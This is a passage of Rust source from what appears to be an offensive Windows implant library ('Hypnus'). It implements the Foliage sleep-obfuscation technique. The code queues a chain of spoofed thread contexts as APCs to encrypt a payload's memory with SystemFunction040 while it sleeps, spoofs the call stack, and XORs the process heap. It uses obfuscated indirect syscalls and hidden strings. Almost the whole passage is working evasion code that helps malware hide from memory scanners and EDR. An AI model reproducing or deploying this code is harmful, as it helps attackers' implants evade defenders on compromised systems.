    /// Performs memory obfuscation using APC injection and hijacked thread contexts.
    /// 
    /// # Arguments
    /// * `wfmo_result_ptr` - Optional pointer to store WaitForMultipleObjects result.
    ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
    ///   via a trampoline during ROP chain execution.
    fn foliage(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Create a manual-reset synchronization event to be signaled after execution
            let mut event = null_mut();
            let mut status = NtCreateEvent(
                &mut event, 
                EVENT_ALL_ACCESS, 
                null_mut(), 
                EVENT_TYPE::SynchronizationEvent, 
                0
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtCreateEvent Failed"));
            }

            // Create a new thread in suspended state for APC injection
            let mut h_thread = null_mut::<c_void>();
            status = uwd::syscall!(
                obf!("NtCreateThreadEx"),
                h_thread.as_ptr_mut(),
                THREAD_ALL_ACCESS,
                null_mut::<c_void>(),
                NtCurrentProcess(),
                (self.cfg.tp_release_cleanup.as_ptr()).add(0x250),
                null_mut::<c_void>(),
                1,
                0,
                0x1000 * 20,
                0x1000 * 20,
                null_mut::<c_void>()
            )? as NTSTATUS;

            if !NT_SUCCESS(status) {
                bail!(s!("NtCreateThreadEx Failed"));
            }

            // Get the initial context of the suspended thread
            let mut ctx_init = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            status = uwd::syscall!(obf!("NtGetContextThread"), h_thread, ctx_init.as_ptr_mut())? as NTSTATUS;
            if !NT_SUCCESS(status) {
                bail!(s!("NtGetContextThread Failed"));
            }

            // Clone the base context 10 times for the full spoofed execution chain
            let mut ctxs = [ctx_init; 10];

            // Duplicate the current thread handle
            let mut thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Preparing for call stack spoofing
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            ctxs[0].Rip = self.cfg.nt_wait_for_single.into();
            ctxs[0].Rcx = event as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporarily makes the target memory region writable before encryption
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypts or masks the specified memory region
            ctxs[2].Rip = self.cfg.system_function040.into();
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Saves the original CONTEXT so it can be restored later
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].Rip = self.cfg.nt_get_context_thread.into();
            ctxs[3].Rcx = thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing)
            ctxs[4].Rip = self.cfg.nt_set_context_thread.into();
            ctxs[4].Rcx = thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep/Wait - setup based on WaitPrimitive
            // Storage for handle array (must live until ROP chain completes)
            let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
            // Track if we're using handle-based wait for stack parameter setup
            let mut using_wfmo_trampoline = false;
            
            match self.wait {
                WaitPrimitive::Timeout { seconds } => {
                    // Original behavior: WaitForSingleObject on thread handle with timeout
                    ctxs[5].Rip = self.cfg.wait_for_single.into();
                    ctxs[5].Rcx = thread as u64;
                    ctxs[5].Rdx = seconds * 1000;
                    ctxs[5].R8  = 0;
                }
                WaitPrimitive::Handles { handles, count, timeout_ms } => {
                    // Use WFMO trampoline to capture the return value
                    handle_storage = handles;
                    using_wfmo_trampoline = !wfmo_result_ptr.is_null();
                    
                    if using_wfmo_trampoline {
                        // Call trampoline which wraps WFMO and stores result
                        ctxs[5].Rip = self.cfg.wfmo_trampoline;
                    } else {
                        // Direct WFMO call (result will be lost)
                        ctxs[5].Rip = self.cfg.wait_for_multiple.into();
                    }
                    ctxs[5].Rcx = count as u64;
                    ctxs[5].Rdx = handle_storage.as_ptr() as u64;
                    ctxs[5].R8  = 0; // bWaitAll = FALSE
                    ctxs[5].R9  = timeout_ms as u64;
                    // 5th and 6th params (result_ptr, wfmo_addr) are written after spoof()
                }
            }

            // Decrypts (unmasks) the memory after waking up
            ctxs[6].Rip = self.cfg.system_function041.into();
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restores the memory protection after decryption.
            ctxs[7].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restores the original thread context
            ctxs[8].Rip = self.cfg.nt_set_context_thread.into();
            ctxs[8].Rcx = thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Gracefully terminates the helper thread after all steps are complete.
            ctxs[9].Rip = self.cfg.rtl_exit_user_thread.into();
            ctxs[9].Rcx = h_thread as u64;
            ctxs[9].Rdx = 0;

            // Layout the entire spoofed CONTEXT chain on the stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Foliage)?;
            
            // Ensure handle_storage lives through the ROP chain
            let _ = &handle_storage;

            // Write `old_protect` values into the expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            
            // For WFMO trampoline, write 5th and 6th parameters to stack
            // [RSP+0x28] = result_ptr, [RSP+0x30] = wfmo_addr
            if using_wfmo_trampoline {
                ((ctxs[5].Rsp + 0x28) as *mut u64).write(wfmo_result_ptr as u64);
                ((ctxs[5].Rsp + 0x30) as *mut u64).write(self.cfg.wait_for_multiple.as_u64());
            }

            // Queue each CONTEXT as an APC to be executed in sequence
            for ctx in &mut ctxs {
                status = NtQueueApcThread(
                    h_thread,
                    self.cfg.nt_continue.as_ptr().cast_mut(),
                    ctx as *mut _ as *mut c_void,
                    null_mut(),
                    null_mut(),
                );

                if !NT_SUCCESS(status) {
                    bail!(s!("NtQueueApcThread Failed"));
                }
            }

            // Trigger the APC chain by resuming the thread in alertable state
            status = NtAlertResumeThread(h_thread, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtAlertResumeThread Failed"));
            }

            // If heap obfuscation is enabled, encrypt memory before execution
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait until the thread finishes the spoofed chain
            status = NtSignalAndWaitForSingleObject(event, h_thread, 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // De-obfuscate heap if needed
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Clean up all handles
            NtClose(event);
            NtClose(h_thread);
            NtClose(thread);
        }

        Ok(())
    }
}

#[doc(hidden)]
pub mod __private {
    use alloc::boxed::Box;
    use super::*;

    /// Execution sequence using the specified obfuscation strategy (backwards compatible).
    pub fn hypnus_entry(base: *mut c_void, size: u64, time: u64, obf: Obfuscation, mode: ObfMode) {
        let master = ConvertThreadToFiber(null_mut());
        if master.is_null() {
            return;
        }

        match Hypnus::new(base as u64, size, time, mode) {
            Ok(hypnus) => {
                // Creates the context to be passed into the new fiber.
                let fiber_ctx = Box::new(FiberContext {
                    hypnus: Box::new(hypnus),
                    obf,
                    master,
                    wfmo_result_ptr: null_mut(), // No handle-based wait
                });

                // Creates a new fiber with 1MB stack, pointing to the `hypnus_fiber` function.
                let fiber = CreateFiber(
                    0x100000, 
                    Some(hypnus_fiber), 
                    Box::into_raw(fiber_ctx).cast()
                );
                
                if fiber.is_null() {
                    return;
                }

                SwitchToFiber(fiber);
                DeleteFiber(fiber);
                ConvertFiberToThread();
            }
            Err(_error) => {
                #[cfg(debug_assertions)]
                dinvk::println!("[Hypnus::new] {:?}", _error);
            }
        }
    }
    
    /// Execution sequence with custom wait primitive, returns which handle was signaled.
    ///
    /// # Wake Reason Detection
    ///
    /// The returned `WakeReason` indicates which handle (if any) caused the wait to complete.
    /// This uses a trampoline mechanism to capture the WFMO return value directly in the
    /// ROP chain, avoiding the race condition that existed with post-hoc polling.
    pub fn hypnus_entry_with_wait(
        base: *mut c_void, 
        size: u64, 
        wait: WaitPrimitive, 
        obf: Obfuscation, 
        mode: ObfMode
    ) -> WakeReason {
        let master = ConvertThreadToFiber(null_mut());
        if master.is_null() {
            return WakeReason::Error;
        }

        match Hypnus::new_with_wait(base as u64, size, wait, mode) {
            Ok(hypnus) => {
                // Storage for WFMO result - initialized to WAIT_TIMEOUT as fallback.
                // The WFMO trampoline will store the actual result here during ROP execution.
                let mut wfmo_result: u64 = WAIT_TIMEOUT as u64;
                
                // Determine handle count for wake reason conversion
                let handle_count = match wait {
                    WaitPrimitive::Timeout { .. } => 0,
                    WaitPrimitive::Handles { count, .. } => count,
                };
                
                // Set result pointer only for handle-based waits
                let wfmo_result_ptr = if handle_count > 0 {
                    &mut wfmo_result as *mut u64
                } else {
                    null_mut()
                };
                
                // Creates the context to be passed into the new fiber.
                let fiber_ctx = Box::new(FiberContext {
                    hypnus: Box::new(hypnus),
                    obf,
                    master,
                    wfmo_result_ptr,
                });

                // Creates a new fiber with 1MB stack, pointing to the `hypnus_fiber` function.
                let fiber = CreateFiber(
                    0x100000, 
                    Some(hypnus_fiber), 
                    Box::into_raw(fiber_ctx).cast()
                );
                
                if fiber.is_null() {
                    return WakeReason::Error;
                }

                SwitchToFiber(fiber);
                DeleteFiber(fiber);
                ConvertFiberToThread();
                
                // For timeout-based waits, always return Timeout
                if handle_count == 0 {
                    return WakeReason::Timeout;
                }
                
                // For handle-based waits, use the captured WFMO result.
                // The trampoline stored the actual return value during ROP chain execution,
                // so this works correctly for both auto-reset and manual-reset events.
                WakeReason::from_wfmo_result(wfmo_result as u32, handle_count)
            }
            Err(_error) => {
                #[cfg(debug_assertions)]
                dinvk::println!("[Hypnus::new_with_wait] {:?}", _error);
                WakeReason::Error
            }
        }
    }

    /// Structure passed to the fiber containing the [`Hypnus`].
    struct FiberContext {
        hypnus: Box<Hypnus>,
        obf: Obfuscation,
        master: *mut c_void,
        /// Pointer to storage for WaitForMultipleObjects result.
        /// When non-null, the WFMO trampoline stores the result here during ROP chain execution.
        /// This solves the race condition where RAX would be lost before we could read it.
        wfmo_result_ptr: *mut u64,
    }

    /// Trampoline function executed inside the fiber.
    ///
    /// It unpacks the `FiberContext`, runs the selected obfuscation method,
    /// and optionally logs errors in debug mode.
    extern "system" fn hypnus_fiber(ctx: *mut c_void) {
        unsafe {
            let mut ctx = Box::from_raw(ctx as *mut FiberContext);
            let wfmo_result_ptr = ctx.wfmo_result_ptr;
            let _result = match ctx.obf {
                Obfuscation::Timer   => ctx.hypnus.timer(wfmo_result_ptr),
                Obfuscation::Wait    => ctx.hypnus.wait(wfmo_result_ptr),
                Obfuscation::Foliage => ctx.hypnus.foliage(wfmo_result_ptr),
            };

            #[cfg(debug_assertions)]
            if let Err(_error) = _result {
                dinvk::println!("[Hypnus] {:?}", _error);
            }

            SwitchToFiber(ctx.master);
        }
    }
}

trait Asu64 {
    /// Converts `self` to a `u64` representing the pointer value.
    fn as_u64(&mut self) -> u64;
}

impl<T> Asu64 for T {
    fn as_u64(&mut self) -> u64 {
        self as *mut _ as *mut c_void as u64
    }
}

/// Iterates over all entries in the process heap and applies
/// an XOR operation to the data of entries marked as allocated.
fn obfuscate_heap(key: &[u8; 8]) {
    let heap = HypnusHeap::get();
    if heap.is_null() {
        return;
    }

    // Walk through all heap entries
    // RtlWalkHeap returns STATUS_SUCCESS (0) for each successful heap entry enumeration,
    // and a non-zero NTSTATUS when enumeration is complete or an error occurs
    let mut entry = unsafe { zeroed::<RTL_HEAP_WALK_ENTRY>() };
    while RtlWalkHeap(heap, &mut entry) == 0 {
        // Check if the entry is in use (allocated block)
        if entry.Flags & 4 != 0 {
            xor(entry.DataAddress as *mut u8, entry.DataSize, key);
        }
    }
}

/// Applies an XOR transformation to a memory region using the given key.
fn xor(data: *mut u8, len: usize, key: &[u8; 8]) {
    if data.is_null() {
        return;
    }

    for i in 0..len {
        unsafe {
            *data.add(i) ^= key[i % key.len()];
        }
    }
}